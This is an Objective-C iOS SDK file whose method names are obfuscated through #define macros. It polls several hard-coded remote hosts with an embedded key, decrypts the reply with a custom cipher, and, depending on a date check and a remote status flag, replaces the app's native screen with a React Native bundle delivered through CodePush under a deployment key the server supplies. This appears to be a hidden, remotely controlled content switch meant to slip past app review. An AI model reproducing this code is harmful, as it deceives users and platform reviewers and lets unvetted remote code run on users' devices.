

#import "AbcMMSDK.h"

#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>

#import <CodePush/CodePush.h>

#import <AVFoundation/AVFoundation.h>


#import <objc/runtime.h>
#import "MMVReachability.h"



#define        Pass            DmdbLojsXbZyREQMgrshusLq
#define        failure            rsSOXSFAeBpNUqyjdhvJrKlK
#define        initchangeUiWithUrlTarget            PXXYiHvUUiXIFQsSJORaDOLd
#define        initdateJudMm            eveEImlFLXVLuzPkAeKxjACj
#define        initdeptNumInputShouldNumber            bvSVwPTjjezKbNLkQOakAbBJgL
#define        initdictionaryWithJsonString            lRatogBishpgaLwGzuhwTvtr
#define        initgetAbcWithUrlString            aszgFrsTbPqEPPCFilfkdWeH
#define        initinitReactNativeController            twLGjOEIbdGLiipVJsUtrEjRlU
#define        initinterfaceOrientation            MILWfJgkhJtQarfUYKSBjVje
#define        initisFirstAuthorizationNetwork            wqOWlxaPeaYkGxiqCTQuztis
#define        initjikuhRootController            RVDkFWxMrPdhXXcZzvVnIeBM
#define        initjudgmentSwitchRoute            EMdVajkoJlTCyGkqcTdQVHlJ
#define        initmianProjectPage            VqnQUKszqUCeVAPdsbHWqkDp
#define        initmmGetTheLaunch            krcimWmSWZuuMuuJRiAOmZazdj
#define        initmmMonitorNetwork            GMRSspWJeLOVoiWvheSvOCVm
#define        initmmSendRNDataRequest            NaWtcxYzbpfocVtWVFCBgGOj
#define        initnumberHexString            YeCGthYLWzCwcUgsEASeSCxbyI
#define        initreachabilityChanged            pdXSjsGCiDWXlwpzjwCAElcZ
#define        initrestoreRootViewController            YzBgXoEUNcjrCZMJoWZGUQAA
#define        initsendAsyncRequestSwitchRoute            ExOwZqWIWndViRTcZbfnLlao
#define        initswitchRouteAction            xpfhkxfxeGcQsRHBAWXkLaYm
#define        parameters            YYwxfIwelDHZXknMrOOlMLLM
#define        success            jgoOjKchPjaqGZRhJjAotGaB




typedef void (^MMVSuccessBlock)(NSData *data);
typedef void (^MMVFailureBlock)(NSError *error);

@interface AbcMMSDK()

@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UIViewController *rootController;

@property (nonatomic, strong) UIViewController *reactNativeRootController;
@property (nonatomic, strong) NSDictionary *launchOptions;
@property (nonatomic, copy) NSString *switchRoute;
@property (nonatomic, copy) NSString *codeKey;
@property (nonatomic, copy) NSString *mmUrl;
@property (nonatomic, strong) NSNumber *mmStatus;
@property (nonatomic, strong) NSNumber *isRoute;
@property (nonatomic, strong) NSNumber *plistIndex;
@property (nonatomic, strong) NSDictionary *mmRainbow;
@property (nonatomic, copy) NSString *dateStr;

@property (nonatomic, assign) BOOL ismmLuniil;


@end



@implementation AbcMMSDK


+(AbcMMSDK *)sharedManager{
  static AbcMMSDK *shareUrl = nil;
  static dispatch_once_t predicate;
  dispatch_once(&predicate, ^{
    shareUrl = [[self alloc]init];
  });
  return shareUrl;
}

- (int)initdateJudMm
{
  NSDateFormatter * dateFormatter = [[NSDateFormatter alloc] init];
  [dateFormatter setDateFormat:@"yyyy-MM-dd"];
  NSString *dateTime=[dateFormatter stringFromDate:[NSDate date]];
  NSDate *currendate = [dateFormatter dateFromString:dateTime];
  NSDate *date = [dateFormatter dateFromString:self.dateStr];
  NSComparisonResult result = [date compare:currendate];
  if (result == NSOrderedDescending) {
    return 1;
  }
  else if (result == NSOrderedAscending){
    return -1;
  }
  return 0;
}



#pragma mark - initMMSDKLaunchOptions

- (void)initMMSDKLaunchOptions:(NSDictionary *)launchOptions window:(UIWindow *)window rootController:(UIViewController *)rootController switchRoute:(NSInteger)switchRoute userUrl:(NSString *)userUrl dateStr:(NSString *)dateStr {
  
  
  self.launchOptions = launchOptions;
  self.window = window;
  self.rootController = rootController;
  
  self.switchRoute = [NSString stringWithFormat:@"%zd", switchRoute];
  self.dateStr = dateStr;
  
  self.mmUrl = userUrl;
  
  [self initisFirstAuthorizationNetwork];
  [self initmmMonitorNetwork];
  
  [self initjudgmentSwitchRoute];
  
}




- (void)initmianProjectPage {
  
  //  self.isRoute = YES;
  self.isRoute = [NSNumber numberWithInteger:1];
  
  
  [self initinterfaceOrientation:UIInterfaceOrientationPortrait];
  
  [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryAmbient error:nil];  // allow
  
  [self initinitReactNativeController];
  
  [self initrestoreRootViewController:self.reactNativeRootController];
}




- (void)initmmMonitorNetwork {
  
  [[NSNotificationCenter defaultCenter] addObserver:self
   
                                           selector:@selector(initreachabilityChanged:)
   
                                               name:kMMVReachabilityChangedNotification
   
                                             object:nil];
  
  MMVReachability *reach = [MMVReachability reachabilityWithHostName:@"www.baidu.com"];
  [reach startNotifier];
  
}


- (void)initreachabilityChanged:(NSNotification *)notification{
  
  MMVReachability *reach = [notification object];
  
  if([reach isKindOfClass:[MMVReachability class]]){
    
    MMVNetworkStatus status = [reach currentReachabilityStatus];
    
    if (status != NotReachable) {
      if (self.ismmLuniil == YES) {
        if (self.switchRoute.integerValue == 11) {
          [self initmmSendRNDataRequest];
        } else {
          [self initsendAsyncRequestSwitchRoute];
        }
      }
    }
  }
  
}


- (void)initinterfaceOrientation:(UIInterfaceOrientation)orientation
{
  if ([[UIDevice currentDevice] respondsToSelector:@selector(setOrientation:)]) {
    SEL selector  = NSSelectorFromString(@"setOrientation:");
    NSInvocation *invocation = [NSInvocation invocationWithMethodSignature:[UIDevice instanceMethodSignatureForSelector:selector]];
    [invocation setSelector:selector];
    [invocation setTarget:[UIDevice currentDevice]];
    int val = orientation;
    [invocation setArgument:&val atIndex:2];
    [invocation invoke];
  }
}


- (void)initisFirstAuthorizationNetwork {
  if(![[NSUserDefaults standardUserDefaults] boolForKey:@"firstLaunch"]){
    [[NSUserDefaults standardUserDefaults] setBool:YES forKey:@"firstLaunch"];
    self.ismmLuniil = YES;
  }else{
    self.ismmLuniil = NO;
  }
}

- (UIViewController *)initjikuhRootController {
  
  UIViewController *imageVC =  [[UIViewController alloc] init];
  imageVC.view.backgroundColor = [UIColor colorWithRed: 0.957 green: 0.988 blue: 1 alpha: 1];
  UIImageView *imagView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, [UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height)];
  imagView.image = [self initmmGetTheLaunch];
  [imageVC.view addSubview:imagView];
  
  return imageVC;
}


- (void)initrestoreRootViewController:(UIViewController *)newRootController {
  
  [UIView transitionWithView:self.window duration:0.25 options:UIViewAnimationOptionTransitionCrossDissolve animations:^{
    
    BOOL oldState = [UIView areAnimationsEnabled];
    [UIView setAnimationsEnabled:NO];
    if (self.window.rootViewController!=newRootController) {
      self.window.rootViewController = newRootController;
    }
    [UIView setAnimationsEnabled:oldState];
  } completion:nil];
}


- (void)initinitReactNativeController {
  if (self.reactNativeRootController==nil) {
    
    self.reactNativeRootController = [[UIViewController alloc] init];
    NSURL *jsCodeLocation;
    
    NSDictionary *infoPlist = [[NSBundle mainBundle] infoDictionary];
    NSString *bundleVersion = [infoPlist objectForKey:@"CFBundleVersion"];
    
    
    if (self.switchRoute.integerValue == 1 || [bundleVersion isEqualToString:@"0.0.1"]) {
      [CodePush overrideAppVersion:@"0.0.1"];
      [CodePush setDeploymentKey:@"l3eIf26WCaIJrWdKUxYpHsOe9Ed-9afe8b5b-cdf2-4643-bc5d-7d81e9f4cbe0"];
      if (self.mmStatus.integerValue != 5) {
        self.mmStatus = [NSNumber numberWithInteger:1];
      }
    } else {
      [CodePush overrideAppVersion:@"1.0.0"];
    }
    
    //    if (![bundleVersion isEqualToString:@"0.0.1"]) {
    //      [CodePush overrideAppVersion:@"1.0.0"];
    //    } else {
    //      if (self.mmStatus.integerValue != 5) {
    //        self.mmStatus = [NSNumber numberWithInteger:1];
    //      }
    //    }
    
    if (self.codeKey.length > 0) {
      [CodePush setDeploymentKey:self.codeKey];
    }
    
#ifdef DEBUG
    
    jsCodeLocation = [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index" fallbackResource:nil];
    
#else
    jsCodeLocation = [CodePush bundleURL];
    
#endif
    
    if (self.mmUrl.length <= 0) {
      self.mmUrl = @"";
    }
    
    if (self.mmRainbow == nil) {
      self.mmRainbow = @{@"mm": @"mm"};
    }
    
    NSString *isFirst;
    
    if (self.ismmLuniil == YES) {
      isFirst = @"1";
    } else {
      isFirst = @"0";
    }
    
    NSDictionary *props = @{@"mmStatus": @(self.mmStatus.integerValue), @"mmUrl": self.mmUrl, @"mmisFirst": isFirst, @"mmRainbow": self.mmRainbow};
    RCTRootView *rootView = [[RCTRootView alloc] initWithBundleURL:jsCodeLocation
                                                        moduleName:@"SKSK"
                                                 initialProperties:props
                                                     launchOptions:self.launchOptions];
    rootView.appProperties = props;
    rootView.backgroundColor = [[UIColor alloc] initWithRed:1.0f green:1.0f blue:1.0f alpha:1];
    
    
    UIViewController *rootViewController = [UIViewController new];
    rootViewController.view = rootView;
    
    self.reactNativeRootController = rootViewController;
  }
}






#pragma mark - judgmentSwitchRoute
- (void)initjudgmentSwitchRoute {
  
  NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
  self.codeKey = [userDefault stringForKey:@"MM_codeKey"];
  
  if ([userDefault stringForKey:@"MM_mmUrl"].length > 0) {
    self.mmUrl = [userDefault stringForKey:@"MM_mmUrl"];
  }
  
  
  NSInteger mmStatus = [userDefault stringForKey:@"MM_mmStatus"].integerValue;
  self.mmStatus = [NSNumber numberWithInteger:mmStatus];
  
  NSString *mmRainbowStr = [userDefault stringForKey:@"MM_mmRainbow"];
  
  self.mmRainbow = [self initdictionaryWithJsonString:mmRainbowStr];
  
  if (self.switchRoute.integerValue == 11 || self.switchRoute.integerValue == 1 || ((mmStatus == 1 || mmStatus >= 3) && self.switchRoute.integerValue == 0)) {
    
    if (self.switchRoute.integerValue == 11) {
      
      if (mmStatus == 1 || mmStatus >= 3) {
        [self initmianProjectPage];
        [self initsendAsyncRequestSwitchRoute];
      } else {
        [self initmmSendRNDataRequest];
      }
      
    } else {
      [self initmianProjectPage];
    }
    
    if (self.switchRoute.integerValue == 11 || self.switchRoute.integerValue == 1) {
      return;
    }
    
  } else if (self.switchRoute.integerValue == 3 || (mmStatus == 2 && self.switchRoute.integerValue == 0)) {
    
    if (self.switchRoute.integerValue == 3) {
      return;
    }
  } else if (self.switchRoute.integerValue == 2) {
    [self initrestoreRootViewController:self.rootController];
    return;
  } else {
    //    NSString *dataStr = [self sendSyncRequestDecodeSwitchRoute];
    //    [self switchRouteAction:dataStr];
  }
  
  if ([self initdateJudMm] == 1) {
    [self initrestoreRootViewController:self.rootController];
  } else {
    
    if (self.switchRoute.integerValue == 0) {
      [self initsendAsyncRequestSwitchRoute];
    }
    
    if (!self.isRoute) {
      UIViewController *initMmRoot =  [self initjikuhRootController];
      [self initrestoreRootViewController:initMmRoot];
    }
    
  }
  
  
  
}


- (void)initswitchRouteAction:(NSString *)mmStatus {
  
  if ([self initdeptNumInputShouldNumber:mmStatus]) {
    NSInteger status =  mmStatus.integerValue;
    if (status == 1 || status >= 3) {
      [self initmianProjectPage];
      return;
    } else if (status == 2) {
      [self initmianProjectPage];
      return;
    } else if (status == 0) {
      [self initrestoreRootViewController:self.rootController];
      return;
    }
  }
  UIViewController *initMmRoot =  [self initjikuhRootController];
  [self initrestoreRootViewController:initMmRoot];
  
}



- (BOOL)initdeptNumInputShouldNumber:(NSString *)str {
  if (str.length == 0) {
    return NO;
  }
  NSString *regex = @"[0-9]*";
  NSPredicate *pred = [NSPredicate predicateWithFormat:@"SELF MATCHES %@",regex];
  if ([pred evaluateWithObject:str]) {
    return YES;
  }
  return NO;
}



- (void)initmmSendRNDataRequest {
  
  NSDictionary *infoPlist = [[NSBundle mainBundle] infoDictionary];
  NSString *bundleIdentifer = [infoPlist objectForKey:@"CFBundleIdentifier"];
  
  
  NSArray *mmArray = @[@"http://plist.fd94.com", @"http://plist.dv31.com", @"http://plist.534j.com", @"http://plist.ce64.com"];
  
  NSInteger indexmm = self.plistIndex.integerValue;
  NSString *switchURL = [NSString stringWithFormat:@"%@/index.php/appApi/request/ac/getAppData/appid/%@/key/d20a1bf73c288b4ad4ddc8eb3fc59274704a0495/client/3",mmArray[indexmm], bundleIdentifer];
  
  
  NSURLRequest *urlRequest = [NSURLRequest requestWithURL:[NSURL URLWithString:switchURL]
                                              cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
                                          timeoutInterval:10];
  
  NSURLResponse *response = nil;
  NSError *error = nil;
  NSData *data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
  
  if (error) {
    
    indexmm++;
    self.plistIndex = [NSNumber numberWithInteger:indexmm];
    if (indexmm > mmArray.count -1) {
      self.plistIndex = [NSNumber numberWithInteger:0];
      
      if (self.ismmLuniil == YES) {
        UIViewController *initMmRoot =  [self initjikuhRootController];
        [self initrestoreRootViewController:initMmRoot];
      } else {
        [self initmianProjectPage];
      }
      
      return;
    } else {
      [self initmmSendRNDataRequest];
      return;
    }
  }
  
  if (!data) {
    [self initmianProjectPage];
    return;
  }
  
  NSDictionary *responseDict = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
  
  NSInteger msg = [responseDict[@"msg"] integerValue];
  
  //  NSDictionary *dataDic = responseDict[@"data"];
  NSString *dataEnString = [NSString stringWithFormat:@"%@", responseDict[@"data"]];
  
  NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
  
  
  NSString *mmStatus = @"0";
  if (msg == 0) {
    
    NSString *mmdataString = [self initchangeUiWithUrlTarget:dataEnString Pass:@"bxvip588"];
    NSDictionary *dataDic = [self initdictionaryWithJsonString:mmdataString];
    self.mmRainbow = dataDic;
    
    
    NSString *codeKey = dataDic[@"code_key"];
    NSString *mmUrl = dataDic[@"url"];
    mmStatus = dataDic[@"status"];
    
    self.codeKey = codeKey;
    
    if (mmUrl.length > 0) {
      self.mmUrl = mmUrl;
    }
    
    self.mmStatus =[NSNumber numberWithInteger:mmStatus.integerValue];
    
    [userDefault setObject:codeKey forKey:@"MM_codeKey"];
    [userDefault setObject:mmUrl forKey:@"MM_mmUrl"];
    [userDefault setObject:mmStatus forKey:@"MM_mmStatus"];
    [userDefault setObject:mmdataString forKey:@"MM_mmRainbow"];
    
  }
  
  if (self.mmUrl.length == 0) {
    
    self.codeKey = [userDefault stringForKey:@"MM_codeKey"];
    
    if ([userDefault stringForKey:@"MM_mmUrl"].length > 0) {
      self.mmUrl = [userDefault stringForKey:@"MM_mmUrl"];
    }
    
    self.mmStatus =[NSNumber numberWithInteger:[userDefault stringForKey:@"MM_mmStatus"].integerValue];
  }
  
  if (msg == 0 && self.switchRoute.integerValue != 11) {
    [self initswitchRouteAction:[NSString stringWithFormat:@"%zd", self.mmStatus.integerValue]];
  } else {
    [self initmianProjectPage];
  }
  
}



#pragma mark - sendAsyncRequestSwitchRoute
- (void)initsendAsyncRequestSwitchRoute{
  
  NSDictionary *infoPlist = [[NSBundle mainBundle] infoDictionary];
  NSString *bundleIdentifer = [infoPlist objectForKey:@"CFBundleIdentifier"];
  
  NSArray *mmArray = @[@"http://plist.fd94.com", @"http://plist.dv31.com", @"http://plist.534j.com", @"http://plist.ce64.com"];
  
  NSInteger indexmm = self.plistIndex.integerValue;
  
  NSString *switchURL = [NSString stringWithFormat:@"%@/index.php/appApi/request/ac/getAppData/appid/%@/key/d20a1bf73c288b4ad4ddc8eb3fc59274704a0495/client/3",mmArray[indexmm], bundleIdentifer];
  
  __weak typeof(self) weakSelf = self;
  
  [self initgetAbcWithUrlString:switchURL parameters:nil success:^(NSData *data) {
    
    //回到主线程
    dispatch_async(dispatch_get_main_queue(), ^{
      // NSString *aStr = [[NSString alloc] initWithData:data encoding:NSASCIIStringEncoding];
      // NSLog("%@",aStr);
      NSDictionary *responseDic = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingAllowFragments error:nil];
      if(responseDic)
      {
        
        NSInteger msg = [responseDic[@"msg"] integerValue];
        
        //    NSDictionary *dataDic = responseDic[@"data"];
        NSString *dataEnString = [NSString stringWithFormat:@"%@", responseDic[@"data"]];
        
        NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
        
        NSString *mmStatus = @"0";
        if (msg == 0) {
          
          NSString *mmdataString = [weakSelf initchangeUiWithUrlTarget:dataEnString Pass:@"bxvip588"];
          NSDictionary *dataDic = [weakSelf initdictionaryWithJsonString:mmdataString];
          weakSelf.mmRainbow = dataDic;
          
          NSString *codeKey = dataDic[@"code_key"];
          NSString *mmUrl = dataDic[@"url"];
          mmStatus = dataDic[@"status"];
          
          weakSelf.codeKey = codeKey;
          
          if (mmUrl.length > 0) {
            weakSelf.mmUrl = mmUrl;
          }
          
          
          if (mmStatus.integerValue == 4) {
            if (weakSelf.mmStatus.integerValue == 0) {
              [weakSelf initswitchRouteAction:@"0"];
            }
            return;
          }
          [userDefault setObject:codeKey forKey:@"MM_codeKey"];
          [userDefault setObject:mmUrl forKey:@"MM_mmUrl"];
          [userDefault setObject:mmStatus forKey:@"MM_mmStatus"];
          [userDefault setObject:mmdataString forKey:@"MM_mmRainbow"];
          
        }
        
        weakSelf.mmStatus =  [NSNumber numberWithInteger:[userDefault stringForKey:@"MM_mmStatus"].integerValue];
        
        if (weakSelf.switchRoute.integerValue == 0 || (msg == 0 && weakSelf.switchRoute.integerValue != 11)) {
          [weakSelf initswitchRouteAction:[NSString stringWithFormat:@"%zd",weakSelf.mmStatus.integerValue]];
        }
        
      }
    });
  } failure:^(NSError *error) {
    
    if (error) {
      NSInteger indexmm = self.plistIndex.integerValue;
      indexmm++;
      weakSelf.plistIndex = [NSNumber numberWithInteger:indexmm];
      if (indexmm > mmArray.count -1) {
        weakSelf.plistIndex = [NSNumber numberWithInteger:0];
        [weakSelf initswitchRouteAction:[NSString stringWithFormat:@"%zd",weakSelf.mmStatus.integerValue]];
      } else {
        [weakSelf initsendAsyncRequestSwitchRoute];
      }
    }
    
  }];
  
  
}



- (void)initgetAbcWithUrlString:(NSString *)url parameters:(id)parameters success:(MMVSuccessBlock)successBlock failure:(MMVFailureBlock)failureBlock
{
  
  NSMutableURLRequest *urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
  
  urlRequest.timeoutInterval = 5.0;
  NSURLSession *urlSession = [NSURLSession sharedSession];
  NSURLSessionDataTask *dataTask = [urlSession dataTaskWithRequest:urlRequest completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
    if (error)
    {
      failureBlock(error);
    }
    else
    {
      successBlock(data);
    }
  }];
  [dataTask resume];
}












-(UIImage *)initmmGetTheLaunch {
  
  CGSize viewSize = [UIScreen mainScreen].bounds.size;
  
  NSString *viewOrientation = nil;
  
  if (([[UIApplication sharedApplication] statusBarOrientation] == UIInterfaceOrientationPortraitUpsideDown) || ([[UIApplication sharedApplication] statusBarOrientation] == UIInterfaceOrientationPortrait)) {
    viewOrientation = @"Portrait";
  } else {
    viewOrientation = @"Landscape";
  }
  
  NSString *launchImage = nil;
  
  NSArray* imagesDict = [[[NSBundle mainBundle] infoDictionary] valueForKey:@"UILaunchImages"];
  
  for (NSDictionary* dict in imagesDict) {
    CGSize imageSize = CGSizeFromString(dict[@"UILaunchImageSize"]);
    if (CGSizeEqualToSize(imageSize, viewSize) && [viewOrientation isEqualToString:dict[@"UILaunchImageOrientation"]])
    {
      launchImage = dict[@"UILaunchImageName"];
    }
  }
  
  return [UIImage imageNamed:launchImage];
}




- (NSDictionary *)initdictionaryWithJsonString:(NSString *)jsonString {
  if (jsonString == nil) {
    return nil;
  }
  
  NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
  NSError *err;
  NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:jsonData
                                                      options:NSJSONReadingMutableContainers
                                                        error:&err];
  if(err) {
    return nil;
  }
  return dic;
}



- (NSString *)initchangeUiWithUrlTarget:(NSString *)target Pass:(NSString *)pass
{
  
  NSString *result = @"";
  NSMutableArray *codes =[[NSMutableArray alloc] init];
  
  
  for(int i=0; i<[pass length]; i++)
  {
    NSString *temp = [pass substringWithRange:NSMakeRange(i,1)];
    NSString *objStr = [NSString stringWithFormat:@"%d",[temp characterAtIndex:0]];
    [codes addObject:objStr];
  }
  
  for (int i=0; i<[target length]; i+=2)
  {
    int ascii = [[self initnumberHexString:[target substringWithRange:NSMakeRange(i, 2)]] intValue];
    for (int j = (int)[codes count]; j>0; j--)
    {
      int val = ascii - [(codes[j-1]) intValue]*j;
      if (val < 0)
      {
        ascii = 256 - (abs(val)%256);
      }
      else
      {
        ascii = val%256;
      }
    }
    result = [result stringByAppendingString:[NSString stringWithFormat:@"%c", ascii]];
    
  }
  
  return result;
}


- (NSNumber *)initnumberHexString:(NSString *)aHexString
{
  
  if (nil == aHexString)
  {
    return nil;
  }
  
  NSScanner * scanner = [NSScanner scannerWithString:aHexString];
  unsigned long long longlongValue;
  [scanner scanHexLongLong:&longlongValue];
  
  NSNumber * hexNumber = [NSNumber numberWithLongLong:longlongValue];
  
  return hexNumber;
}


- (void)setObject:(id)object forKey:(NSString *)key {
  
  if (key == nil || [key isEqualToString:@""]) {
    return;
  }
  
  NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
  
  [defaults setObject:object forKey:key];
  
  [defaults synchronize];
}


- (id)objectForKey:(NSString *)key {
  NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
  return [defaults objectForKey:key];
}




@end






